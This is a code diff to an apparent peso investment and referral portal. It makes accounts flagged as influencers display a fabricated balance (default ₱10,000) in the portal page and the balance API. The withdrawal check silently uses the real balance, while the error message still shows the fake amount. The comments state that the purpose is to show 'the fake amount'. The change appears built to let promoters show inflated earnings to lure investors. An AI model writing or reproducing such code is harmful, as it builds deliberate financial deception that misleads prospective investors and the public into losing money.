@@ -73,7 +73,13 @@ def get_portal_user():
     uid = session.get("portal_user_id")
     if not uid:
         return None
-    return get_db().get_user(uid)
+    user = get_db().get_user(uid)
+    if user and user.get("is_influencer"):
+        # Overlay the display balance so the portal shows the fake amount.
+        # We clone the dict to avoid mutating the cached row.
+        user = dict(user)
+        user["balance"] = float(user.get("influencer_display_balance") or 10000.0)
+    return user
 
 
 # ---------------------------------------------------------------------------
@@ -470,14 +476,14 @@ def me():
 @portal_login_required
 def api_balance():
     db = get_db()
-    user = get_portal_user()
+    user = get_portal_user()   # already applies influencer display balance override
     if not user:
         return jsonify({"error": "not found"}), 404
     ref_info = db.referral_stats(user["user_id"])
     investments = db.list_investments(user_id=user["user_id"], status="active", limit=20)
     live_earnings = sum(db.compute_investment_earnings_to_date(inv) for inv in investments)
     return jsonify({
-        "balance": float(user["balance"]),
+        "balance": float(user["balance"]),   # display balance for influencers
         "total_earned": float(user["total_earned"]),
         "total_invested": float(user["total_invested"]),
         "total_deposited": float(user["total_deposited"]),
@@ -639,6 +645,12 @@ def withdraw():
     # Re-fetch balance fresh from DB to avoid stale session data
     fresh_user = db.get_user(user["user_id"])
     balance = float(fresh_user["balance"]) if fresh_user else 0.0
+    # For influencer accounts show the display balance on the page,
+    # but enforce the REAL balance for the actual withdrawal check.
+    real_balance = balance
+    if fresh_user and fresh_user.get("is_influencer"):
+        balance = float(fresh_user.get("influencer_display_balance") or 10000.0)
+    # (real_balance stays as the actual DB balance in both cases)
 
     error = None
     success = None
@@ -659,7 +671,7 @@ def withdraw():
                     error = "Amount must be positive."
                 elif amount_val < min_wd_php:
                     error = f"Minimum withdrawal is ₱{min_wd_php:,.2f}."
-                elif amount_val > balance:
+                elif amount_val > real_balance:
                     error = f"Insufficient balance. Your balance is ₱{balance:,.2f}."
                 else:
                     # Atomic deduct — update_balance returns None if it would go negative
